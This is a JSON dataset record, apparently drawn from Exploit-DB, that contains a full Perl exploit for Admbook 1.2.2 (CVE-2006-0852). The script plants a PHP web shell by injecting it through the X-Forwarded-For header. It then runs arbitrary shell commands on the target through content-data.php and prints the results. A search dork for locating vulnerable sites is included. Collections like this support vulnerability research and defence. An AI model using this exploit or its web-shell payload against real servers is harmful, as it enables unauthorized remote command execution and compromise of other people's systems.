{
  "id": "1512",
  "title": "Admbook 1.2.2 - &#039;x-forwarded-for&#039; Remote Command Execution",
  "cve": "CVE-2006-0852",
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl -w\r\nuse IO::Socket;\r\n\r\nprint \"*************************************************************************\\r\\n\";\r\nprint \"|            Admbook <=1.2.2 X-Forwarded-For cmmnds xctn xploit        |\\r\\n\";\r\nprint \"|                     By rgod rgod<AT>autistici<DOT>org                |\\r\\n\";\r\nprint \"|                   site: http://retrogod.altervista.org               |\\r\\n\";\r\nprint \"|                                                                      |\\r\\n\";\r\nprint \"| Sun-Tzu: \\\"Rouse him, and learn the principle of his  activity  or    |\\r\\n\";\r\nprint \"| inactivity.  Force him to reveal himself,  so as to find out  his    |\\r\\n\";\r\nprint \"| vulnerable spots.\\\"                                                   |\\r\\n\";\r\nprint \"*************************************************************************\\r\\n\";\r\nprint \"| dork:  intitle:admbook intitle:version filetype:php                   |\\r\\n\";\r\nprint \"*************************************************************************\\r\\n\";\r\nsub main::urlEncode {\r\n    my ($string) = @_;\r\n    $string =~ s/(\\W)/\"%\" . unpack(\"H2\", $1)/ge;\r\n    #$string# =~ tr/.//;\r\n    return $string;\r\n }\r\n\r\n$serv=$ARGV[0];\r\n$path=$ARGV[1];\r\n$cmd=\"\"; for ($i=2; $i<=$#ARGV; $i++) {$cmd.=\"%20\".urlEncode($ARGV[$i]);};\r\n\r\nif (@ARGV < 3)\r\n{\r\nprint \"Usage:\\r\\n\";\r\nprint \"perl admbook_122_xpl.pl SERVER PATH COMMAND\\r\\n\\r\\n\";\r\nprint \"SERVER         - Server where AdmBook is installed.\\r\\n\";\r\nprint \"PATH           - Path to AdmBook (ex: /admbook/ or just /) \\r\\n\";\r\nprint \"COMMAND        - A shell command \\r\\n\";\r\nprint \"Example:\\r\\n\";\r\nprint \"perl admbook_122_xpl.pl localhost /admbook/ ls -la\\r\\n\";\r\nexit();\r\n}\r\n\r\n$sock = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$serv\", Timeout  => 10, PeerPort=>\"http(80)\")\r\nor die \"[+] Connecting ... Could not connect to host.\\n\\n\";\r\n               \r\n$SHELL='\";if (isset($_GET[CMD])){ECHO\"Hi Master!\";INI_SET(\"max_execution_time\",0);PASSTHRU($_GET[CMD]);DIE;}echo\"';\r\n$data=\"page=1\";\r\n$data.=\"&name=whoami\";\r\n$data.=\"&url=\";\r\n$data.=\"&email=whoami\\@SUNTZU.COM\";\r\n$data.=\"&icq=\";\r\n$message=urlEncode(\"I love italian guys!\");\r\n$data.=\"&message=\".$message;\r\nprint $sock \"POST \".$path.\"write.php HTTP/1.1\\r\\n\";\r\nprint $sock \"Referer: http://\".$serv.$path.\"index.php\\r\\n\";\r\nprint $sock \"X-Forwarded-For: GUESS_WHAT:\".$SHELL.\"\\r\\n\";\r\nprint $sock \"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\nprint $sock \"User-Agent: sun-tzu\\r\\n\";\r\nprint $sock \"Content-Length: \".length($data).\"\\r\\n\";\r\nprint $sock \"Host: \".$serv.\"\\r\\n\";\r\nprint $sock \"Connection: Close\\r\\n\\r\\n\";\r\nprint $sock $data;\r\nclose($sock);\r\n\r\nsleep(2);\r\n\r\n$sock = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$serv\", Timeout  => 10, PeerPort=>\"http(80)\")\r\nor die \"[+] Connecting ... Could not connect to host.\\n\\n\";\r\n\r\nprint $sock \"GET \".$path.\"content-data.php?CMD=\".$cmd.\" HTTP/1.1\\r\\n\";\r\nprint $sock \"Host: \".$serv.\"\\r\\n\";\r\nprint $sock \"Connection: close\\r\\n\\r\\n\";\r\n\r\nwhile ($answer = <$sock>) {\r\n  print $answer;\r\n}\r\nclose($sock);\r\n\r\n# milw0rm.com [2006-02-19]",
  "url": "https://www.exploit-db.com/exploits/1512"
}